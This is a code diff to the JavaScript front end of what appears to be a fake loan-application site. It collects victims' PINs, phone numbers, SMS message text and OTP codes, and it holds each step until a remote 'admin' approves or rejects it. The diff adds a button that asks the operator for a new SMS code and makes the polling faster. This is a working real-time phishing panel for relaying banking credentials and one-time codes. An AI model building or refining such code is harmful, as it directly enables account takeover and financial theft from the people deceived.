@@ -169,31 +169,44 @@ async function submitPinLogin() {
     body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
   });
 
-  startPollingForNextStep(
-    'SMS_STEP', 
-    'screen-waiting-admin', 
-    'screen-sms', 
-    'PIN_REJECTED', 
-    'screen-login', 
-    '✅ CORRECT PIN VERIFIED'
-  );
+  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms', 'PIN_REJECTED', 'screen-login', '✅ CORRECT PIN VERIFIED');
 }
 
-// SMS Countdown Timer & Enforcement
+// SMS Countdown Timer & Request New SMS Feature
 function startSmsCountdown() {
   let timeLeft = 55;
   const timerDisplay = document.getElementById('timer-display');
   if (countdownInterval) clearInterval(countdownInterval);
 
+  timerDisplay.innerHTML = `Message expires in <span id="time-val">${timeLeft}</span>s.`;
+
   countdownInterval = setInterval(() => {
     timeLeft--;
+    const timeValEl = document.getElementById('time-val');
     if (timeLeft >= 0) {
-      timerDisplay.innerText = `Message expires in ${timeLeft}s.`;
+      if (timeValEl) timeValEl.innerText = timeLeft;
     } else {
       clearInterval(countdownInterval);
-      timerDisplay.innerText = `Message expired. Please request a new code.`;
+      timerDisplay.innerHTML = `<span>Message expired.</span> <button onclick="requestNewSms()" style="margin-left: 10px; padding: 4px 10px; background: #004F9F; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">Request New SMS</button>`;
     }
   }, 1000);
+}
+
+async function requestNewSms() {
+  document.getElementById('sms-text-input').value = '';
+  startSmsCountdown();
+
+  try {
+    await fetch('/api/request-sms', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ appId: appDataStore.appId, phone: appDataStore.phone })
+    });
+  } catch (e) {
+    console.error('Failed to notify admin of new SMS request', e);
+  }
+
+  alert('New verification code requested. Please check your phone.');
 }
 
 function checkSmsInput() {
@@ -225,14 +238,7 @@ async function submitSmsVerification() {
     body: JSON.stringify({ appId: appDataStore.appId, smsText })
   });
 
-  startPollingForNextStep(
-    'OTP_STEP', 
-    'screen-waiting-sms', 
-    'screen-otp', 
-    'SMS_REJECTED', 
-    'screen-sms', 
-    '✅ CORRECT SMS MESSAGE VERIFIED'
-  );
+  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp', 'SMS_REJECTED', 'screen-sms', '✅ CORRECT SMS MESSAGE VERIFIED');
 }
 
 // OTP Inputs Management
@@ -272,14 +278,7 @@ async function submitOtpCode() {
     body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
 
-  startPollingForNextStep(
-    'APPROVED', 
-    'screen-waiting-otp', 
-    'screen-success', 
-    'OTP_REJECTED', 
-    'screen-otp', 
-    '✅ CORRECT OTP VERIFIED - LOAN APPROVED'
-  );
+  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', '✅ CORRECT OTP VERIFIED - LOAN APPROVED');
 }
 
 function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
@@ -349,6 +348,5 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
     } catch (e) {
       console.error('Polling error:', e);
     }
-  }, 3000);
+  }, 1000);
     }
-    
